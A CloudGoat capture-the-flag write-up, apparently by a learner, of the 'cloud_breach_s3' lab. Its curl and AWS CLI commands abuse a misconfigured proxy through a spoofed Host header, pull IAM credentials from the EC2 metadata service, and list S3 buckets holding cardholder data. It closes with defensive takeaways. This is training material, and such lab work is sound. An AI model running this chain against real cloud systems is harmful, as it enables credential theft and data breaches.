# Pre - requisites

After I deployed my Terraform environment, I get the Cloud Breach S3 - Attack Scenario. I could see the information which I use to solve my lab.

target_ec2_ip = "3.236.36.32"
scenario_name = "cloud-breach-s3-cm9n3kop"
imdsv_version = "IMDSv1 (Vulnerable)"

# Step 1

I have to test my EC2 instance to check if everything is running correctly. I used this command:

curl http://3.236.36.32

The server returned an HTML page showing a proxy error message. The page explained that the server was configured to proxy requests to the EC2
metadata service and suggested modifying the host header. lso it show me this IP 169.254.169.254.

# Step 2

Next, I tried to access the metadata service through the vulnerable proxy by changing the host header usin this command

curl http://3.236.36.32/latest/meta-data/iam/security-credentials/ -H "Host: 169.254.169.254"

This command sends a request to the EC2 instance to returned the IAM role name. This is my result:

cloud-breach-s3-cm9n3kop-banking-WAF-Role


# Step 3

After discovering the IAM role name, I requested the temporary security credentials associated with that role:

curl http://3.236.36.32/latest/meta-data/iam/security-credentials/cloud-breach-s3-cm9n3kop-banking-WAF-Role -H "Host: 169.254.169.254"

I get this information from the proxy: AccessKeyId, SecretAccessKey, and Token.

# Step 4

Next, I exported the stolen credentials into the shell environment to use the stolen temporary credentials for my next steps:

export AWS_ACCESS_KEY_ID= data
export AWS_SECRET_ACCESS_KEY= data
export AWS_SESSION_TOKEN data
export AWS_DEFAULT_REGION data


# Step 5

I check if the stlen credentiales are valids using this command:

aws sts get-caller-identity

I get:

Account: 545426309738
An ARN showing an assumed role session: arn:aws:sts::545426309738:assumed-role/cloud-breach-s3-cm9n3kop-banking-WAF-Role/i-021ab060a3b1e9a3a

This confirmed successful credential theft.

# Step 6

Test if I can see the files inside of the S3 bucket


aws s3 ls

2026-04-16 21:44:28 cloud-breach-s3-cm9n3kop-cardholder-data
2026-02-07 20:34:56 iam-privesc-ec2-hg5ix4md-exfil-bucket
2026-02-07 20:34:56 iam-privesc-ec2-hg5ix4md-secret-flag
2026-02-02 20:53:05 iam-privesc-ec2-qo2v063a-exfil-bucket
2026-02-02 20:53:05 iam-privesc-ec2-qo2v063a-secret-flag



aws s3 ls s3://cloud-breach-s3-cm9n3kop-cardholder-data

2026-04-16 21:44:29        470 FLAG.txt
2026-04-16 21:44:29        366 cardholder_data_primary.csv
2026-04-16 21:44:29        381 cardholder_data_secondary.csv


# Final Step

FLAG.txt file data


Congratulations! You have successfully completed the cloud_breach_s3 scenario!

You exploited:
1. A misconfigured reverse proxy server
2. Instance Metadata Service (IMDS) exposure
3. Overly permissive IAM role attached to EC2

Key Takeaways:
- Always use IMDSv2 with session tokens
- Configure reverse proxies to only allow specific Host headers
- Apply least privilege principle to IAM roles
- Use VPC endpoints for S3 access

Flag: CLOUDGOAT{cm9n3kop_BREACH_COMPLETE}
